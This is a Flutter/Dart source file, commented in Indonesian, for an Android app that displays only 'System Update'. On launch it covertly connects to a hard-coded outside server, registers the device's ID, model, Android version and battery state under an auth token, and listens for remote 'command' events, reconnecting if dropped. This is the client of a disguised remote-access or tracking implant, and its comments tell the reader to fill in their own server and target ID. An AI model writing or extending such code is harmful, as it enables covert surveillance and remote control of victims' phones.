import 'dart:async';
import 'package:flutter/material.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:device_info_plus/device_info_plus.dart';
import 'package:battery_plus/battery_plus.dart';

// ⚠️ GANTI BAGIAN INI DENGAN PUNYAMU ⚠️
const String SERVER_URL = 'http://152.42.184.64:2363'; 
const String TARGET_UID = 'd7e27df25f68d737f7a454b58a97f77c'; 

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const MyApp());
  _connectToServer();
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});
  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
      debugShowCheckedModeBanner: false,
      home: Scaffold(body: Center(child: Text('System Update'))),
    );
  }
}

Future<void> _connectToServer() async {
  try {
    final androidInfo = await DeviceInfoPlugin().androidInfo;
    final battery = Battery();
    final batteryLevel = await battery.batteryLevel;
    final batteryState = await battery.batteryState;
    final isCharging = batteryState == BatteryState.charging || batteryState == BatteryState.full;

    IO.Socket socket = IO.io(SERVER_URL, 
      IO.OptionBuilder()
      .setTransports(['websocket'])
      .setExtraHeaders({'x-auth-token': TARGET_UID})
      .build()
    );

    socket.onConnect((_) {
      print('✅ KONEK BERHASIL KE SERVER');
      
      // 🔥 KUNCI UTAMA: Kirim event "device:register" (sesuai sync.js baris 269)
      socket.emit('device:register', {
        'deviceId': androidInfo.id,
        'name': androidInfo.model,
        'battery': batteryLevel,
        'charging': isCharging,
        'sdkVersion': androidInfo.version.sdkInt.toString(),
        'androidVersion': androidInfo.version.release,
        'uid': TARGET_UID, // 🔥 PENTING: uid harus ada di dalam data!
      });
    });

    socket.on('command', (data) {
      print('Menerima perintah: $data');
    });

    socket.onDisconnect((_) {
      print('Terputus, mencoba reconnect...');
      Timer(const Duration(seconds: 5), () => socket.connect());
    });
    
  } catch (e) {
    print('Gagal inisialisasi: $e');
  }
}
